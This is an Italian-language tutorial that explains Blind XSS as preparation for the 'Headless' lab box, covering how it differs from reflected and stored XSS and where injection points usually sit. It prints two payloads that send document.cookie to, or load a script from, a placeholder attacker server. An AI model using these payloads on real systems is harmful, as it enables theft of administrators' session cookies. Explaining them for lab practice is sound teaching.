Ottima scelta per imparare — Headless è un buon box per consolidare il concetto.

## Cos'è il Blind XSS

Il **Blind XSS** è una variante del **Stored [[XSS]]** in cui il payload viene eseguito in un contesto che **l'attaccante non può vedere direttamente**.

Il flusso tipico è questo:

1. L'attaccante inietta un payload in un campo (form, header HTTP, user-agent, ecc.)
2. Il payload viene **salvato lato server** (database, log, sistema di ticketing…)
3. Il payload viene **renderizzato in un secondo momento**, in un pannello admin, una dashboard, un tool interno — qualcosa a cui l'attaccante non ha accesso diretto
4. Il browser della **vittima** (spesso un admin) esegue il JavaScript

La parola _blind_ sta proprio lì: non vedi l'output, non sai se il payload è scattato. Devi **fartelo dire** dalla macchina della vittima.

## Come si capisce se è scattato

Siccome non hai feedback diretto, il payload classico fa una **richiesta out-of-band** verso un server che controlli tu:

```javascript
<script>
  new Image().src = "http://TUO-SERVER/?c=" + document.cookie;
</script>
```

oppure carica uno script esterno:

```javascript
<script src="http://TUO-SERVER/payload.js"></script>
```

Quando il browser della vittima esegue il codice, il tuo server riceve la richiesta — e **sai che il payload è scattato**, e cosa ha esfiltrato.

## Differenza con XSS Reflected e Stored "classico"

||Reflected|Stored classico|**Blind XSS**|
|---|---|---|---|
|Dove vive il payload|Solo nell'URL/request|DB, visibile all'attaccante|DB, **contesto separato**|
|Chi lo esegue|L'attaccante stesso|Chiunque visiti la pagina|Un utente privilegiato in area non pubblica|
|Feedback immediato|Sì|Sì|**No**|

## Dove si trova in pratica

I punti di iniezione tipici per blind XSS sono campi che finiscono in **aree admin o di logging**:

- Form di supporto / feedback
- Campi `User-Agent`, `X-Forwarded-For`, `Referer` nelle request HTTP (finiscono nei log visualizzati dagli admin)
- Sistemi di ticketing interni
- Campi nome/cognome in registrazioni

---

Con questo in testa, quando esplori Headless pensa a: _quali input accetta l'applicazione? Quali di questi potrebbero essere letti da qualcuno in un contesto diverso dal mio?_ Quella è la domanda da farti prima di iniettare qualsiasi cosa.